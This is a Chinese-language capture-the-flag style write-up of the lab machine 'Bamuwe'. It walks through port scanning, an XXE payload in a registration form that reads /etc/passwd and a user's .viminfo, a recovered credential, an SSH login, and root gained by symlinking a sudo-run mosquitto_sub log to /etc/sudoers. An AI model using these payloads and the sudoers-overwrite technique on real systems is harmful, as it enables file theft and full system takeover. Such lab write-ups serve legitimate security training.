## 渗透测试报告 - Bamuwe

## 1. 简介

**靶机名称**: Bamuwe(未发布，内部测试靶机，可能后续发布于 HackMyVm)
**难度**: 简单
**攻击者 IP:** `192.168.205.188` (Kali Linux)
**目标 IP:** `192.168.205.197` (Bamuwe)

## 2. 信息收集 (Enumeration)

### 2.1. 网络发现 (Network Discovery)

使用 `arp-scan` 在本地网络中探测存活主机。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l           
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.188
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
# ... (其他主机) ...
192.168.205.197 08:00:27:a0:8d:89       (Unknown) # <-- 发现目标
# ... (其他主机) ...

Ending arp-scan 1.10.0: 256 hosts scanned in 1.891 seconds (135.38 hosts/sec). 4 responded
```

目标主机 IP 确定为 `192.168.205.197`。MAC 地址 `08:00:27:a0:8d:89` 

### 2.2. 端口扫描 (Port Scanning)

使用 `nmap` 对目标进行端口扫描，识别开放的 TCP 端口。

* 进行全端口扫描 (`-p-`) 确定开放端口。

  ```bash
  ┌──(kali㉿kali)-[~]
  └─$ nmap -p- 192.168.205.197
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 08:20 EDT
  Nmap scan report for 192.168.205.197
  Host is up (0.00016s latency).
  Not shown: 65533 closed tcp ports (reset)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 08:00:27:A0:8D:89 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
  ```

  结果显示目标开放了两个常见的端口：`22 (SSH)` 和 `80 (HTTP)`。

### 2.3. Web 服务探测 (Web Enumeration)

Web 服务通常是获取初始访问权限的突破口，因此我首先检查了 80 端口的 HTTP 服务。使用 `curl` 或浏览器访问 `http://192.168.205.197`。

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.205.197                                     
<!DOCTYPE html>
    <html>
    <head>
        <title>Library Membership Registration</title>
        <style>
            body {
                background: #f0f2f5;
                font-family: "Helvetica Neue", Arial, sans-serif;
                margin: 0;
                padding: 20px;
            }
            .container {
                max-width: 500px;
                margin: 40px auto;
                background: white;
                padding: 40px;
                border-radius: 12px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            h2 {
                color: #1a73e8;
                margin-bottom: 30px;
                text-align: center;
            }
            .form-group {
                margin-bottom: 20px;
            }
            label {
                display: block;
                margin-bottom: 8px;
                color: #5f6368;
                font-weight: 500;
            }
            input[type="text"], 
            input[type="password"] {
                width: 100%;
                padding: 12px;
                border: 1px solid #dadce0;
                border-radius: 6px;
                font-size: 16px;
                transition: border-color 0.2s;
            }
            input[type="text"]:focus, 
            input[type="password"]:focus {
                border-color: #1a73e8;
                outline: none;
            }
            input[type="submit"] {
                background: #1a73e8;
                color: white;
                padding: 14px 24px;
                border: none;
                border-radius: 6px;
                font-size: 16px;
                cursor: pointer;
                width: 100%;
                transition: background 0.2s;
            }
            input[type="submit"]:hover {
                background: #1557b0;
            }
            .result {
                padding: 20px;
                background: #e8f0fe;
                border-radius: 6px;
                color: #1967d2;
                margin-top: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Member Registration</h2>
            <form method="post">
                <div class="form-group">
                    <label>Full Name:</label>
                    <input type="text" name="name">
                </div>
                <div class="form-group">
                    <label>Phone Number:</label>
                    <input type="text" name="tel">
                </div>
                <div class="form-group">
                    <label>Email Address:</label>
                    <input type="text" name="email">
                </div>
                <div class="form-group">
                    <label>Password:</label>
                    <input type="password" name="password">
                </div>
                <input type="submit" value="Register Now">
            </form>
        </div>
        
        <!-- XML STRUCTURE EXAMPLE -->
        <!--
        <user>
          <name>John Doe</name>
          <tel>123-4567890</tel>
          <email>admin@admin.com</email>
          <password>secret123</password>
        </user>
        -->
    </body>
    </html>
```

这个 XML 注释强烈暗示了后端可能使用 XML 格式来处理用户提交的注册信息。这立即让我怀疑是否存在 **XML 外部实体注入 (XXE)** 漏洞。

![Web Registration Page](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250430202620701.png)

## 3. 获取初始访问权限 (Initial Access - XXE)

### 3.1. 确认漏洞 (Confirming Vulnerability)

为了验证 XXE 漏洞，我需要构造一个包含 XML 外部实体声明的 POST 请求。

![XXE Payload Preparation](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250430202715434.png)

我注意到提交表单后，输入的 Email 地址会被回显到响应页面中。这提供了一个方便的位置来注入并显示外部实体的内容。

**构造 HTTP POST 请求 (使用 Burp Repeater):**

```http
POST / HTTP/1.1
Host: 192.168.205.197
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 231
Origin: http://192.168.205.197
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://192.168.205.197/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <user>
          <name>John Doe</name>
          <tel>123-4567890</tel>
          <email>&xxe;</email>
          <password>secret123</password>
        </user>
```

* **分析响应:**

  服务器返回的响应页面中，原本显示 Email 的地方，现在显示了 `/etc/passwd` 文件的内容。

  ![XXE Result - /etc/passwd Content](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250430203121961.png)

  这成功确认了 XXE 漏洞的存在。从 `/etc/passwd` 的内容中，我注意到了一个名为 `welcome` 的普通用户 (`uid=1000`)。

### 3.2. 漏洞利用 (Exploitation - Credential Discovery)

确认漏洞后，目标是利用它来获取敏感信息，最好是用户凭据。考虑到 `welcome` 用户的存在，我尝试读取其家目录下的常见敏感文件。在尝试了 `.bash_history`、`.ssh/id_rsa` 等文件无果后，我决定尝试读取 `.viminfo` 文件。Vim 编辑器的历史记录文件有时会意外地包含密码或其他敏感信息。

* **构造读取 `.viminfo` 的 Payload:**

  ```http
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/welcome/.viminfo">]>
  <user>
      <name>John Doe</name>
      <tel>123-4567890</tel>
      <email>&xxe;</email>
      <password>secret123</password>
  </user>
  ```

* **发现凭据:**
  发送请求后，服务器返回的响应中包含了 `/home/welcome/.viminfo` 文件的内容。可以看到，之前的用户读取了`pass.txt`

  ![XXE Result - Credentials in .viminfo](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250430203435219.png)

  我们通过xxe获取pass.txt文件，可以得到

  ```html
  <div class='result'>Registration Status: Email 【welcome:bd7787d41a6b28e9976873cf6a8445fe
  】 submitted!</div>
  ```

  成功提取到凭据：`welcome:bd7787d41a6b28e9976873cf6a8445fe`

### 3.3. 登录系统 (Gaining Access)

获得了 `welcome` 用户的用户名和密码，我立即尝试通过 SSH 登录目标系统。

```bash
┌──(kali㉿kali)-[~]
└─$ ssh welcome@192.168.205.197
The authenticity of host '192.168.205.197 (192.168.205.197)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.197' (ED25519) to the list of known hosts.
welcome@192.168.205.197's password: 
Linux Bamuwe 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Apr 11 22:27:59 2025 from 192.168.3.94
welcome@Bamuwe:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

成功以 `welcome` 用户身份登录目标系统。

## 4. 权限提升 (welcome -> root - Sudo Misconfiguration & MQTT Abuse)

### 4.1. 以 welcome 身份进行信息收集 (Enumeration as welcome)

登录后，首要任务是寻找权限提升的途径。我首先检查了 `welcome` 用户的 `sudo` 权限。

```bash
welcome@Bamuwe:~$ sudo -l
Matching Defaults entries for welcome on Bamuwe:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Bamuwe:
    (ALL) NOPASSWD: /opt/sub.sh
```

这是一个重大的发现！`welcome` 用户可以 **无需密码** (`NOPASSWD`) 以 **root** (`ALL`) 权限执行 `/opt/sub.sh` 脚本。接下来，需要检查这个脚本做了什么。

```bash
welcome@Bamuwe:~$ ls -al /opt/
total 12
drwxr-xr-x  2 root root 4096 Apr 28 10:50 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
-rwxr-xr-x  1 root root   52 Apr 28 10:50 sub.sh
welcome@Bamuwe:~$ cat /opt/sub.sh
#!/bin/bash
/usr/bin/mosquitto_sub "$@" > /home/welcome/sub.log
```

脚本内容很简单：它执行 `mosquitto_sub`（一个 MQTT 订阅客户端），并将所有命令行参数 (`"$@"`) 传递给该命令。关键在于，脚本的标准输出被重定向到了 `/home/welcome/sub.log` 文件。由于脚本是通过 `sudo` 以 root 身份运行的，这意味着我们可以利用这个脚本以 root 权限 **写入** `/home/welcome/sub.log` 文件。

### 4.2. 利用策略 (Exploitation Strategy)

1. 这个 `sudo` 规则和脚本提供了一个清晰的提权路径：利用 root 权限写入 `/home/welcome/sub.log` 的能力，结合符号链接 (Symbolic Link) 来覆盖系统上的任意文件。我们的目标是覆盖 `/etc/sudoers` 文件，添加一条允许 `welcome` 用户无密码执行所有命令的规则。

   具体计划如下：

   1.  在 `/home/welcome/` 目录下，创建一个名为 `sub.log` 的符号链接，让它指向 `/etc/sudoers`。
   2.  在一个 SSH 终端中，以 `welcome` 用户身份执行 `sudo /opt/sub.sh -t "exp"` (选择一个 MQTT 主题，例如 "exp")。这将以 root 权限启动 `mosquitto_sub` 进程，该进程会监听 "exp" 主题，并将收到的任何消息写入 `/home/welcome/sub.log`，也就是通过符号链接写入 `/etc/sudoers`。
   3.  打开第二个 SSH 终端，同样以 `welcome` 用户身份登录。使用 `mosquitto_pub` 命令向 "exp" 主题发布一条新的 `sudoers` 规则，例如 `welcome ALL=(ALL) NOPASSWD:ALL`。
   4.  这条规则会被第一个终端中以 root 身份运行的 `mosquitto_sub` 接收，并覆盖 `/etc/sudoers` 文件。
   5.  完成以上步骤后，`welcome` 用户应该就获得了无密码执行任何命令的 `sudo` 权限。

### 4.3. 执行利用 (Executing the Exploit)

按照计划执行：

1. **创建符号链接:**
   (首先确保 `/home/welcome/sub.log` 不存在，或者删除它)

   ```bash
   welcome@Bamuwe:~$ ln -sf /etc/sudoers /home/welcome/sub.log 
   ```

2. **启动 MQTT 订阅者 (监听并准备写入 sudoers):**
   在第一个 SSH 终端窗口中执行：

   ```bash
   welcome@Bamuwe:~$ sudo /opt/sub.sh -t "exp" 
   ```

   这个命令会挂起，等待消息。此时，一个以 root 权限运行的 `mosquitto_sub` 进程正在监听 "exp" 主题，准备将收到的消息写入 `/etc/sudoers`。

3. **发布恶意的 Sudoers 规则:**
   打开第二个 SSH 终端窗口，以 `welcome` 用户登录，并执行：

   ```bash
   welcome@Bamuwe:~$ echo 'welcome ALL=(ALL) NOPASSWD:ALL' | mosquitto_pub -t "exp" -l
   ```

   这条命令使用 `mosquitto_pub` 将我们精心构造的 `sudoers` 规则作为单行消息 (`-l` 选项) 发布到 "exp" 主题。


### 4.4. 获取 Root 权限 (Gaining Root Access)

现在，恶意的 `sudoers` 规则应该已经被写入 `/etc/sudoers` 文件。我们可以验证 `welcome` 用户的新权限。

1. **验证新权限:**
   回到**第二个**终端，执行 `sudo -l`：

   ```bash
   welcome@Bamuwe:~$ sudo -l
   Matching Defaults entries for welcome on Bamuwe:
       env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
   
   User welcome may run the following commands on Bamuwe:
       (ALL) NOPASSWD: ALL   # <--- 成功！权限已提升
   ```

   输出确认 `welcome` 用户现在可以无密码执行所有命令。

2. **获取 Root Shell:**
   最后一步，切换到 root 用户：

   ```bash
   welcome@Bamuwe:~$ sudo su -
   root@Bamuwe:~# id
   uid=0(root) gid=0(root) groups=0(root)
   root@Bamuwe:~# whoami
   root
   ```

成功获取了目标系统的 root 权限。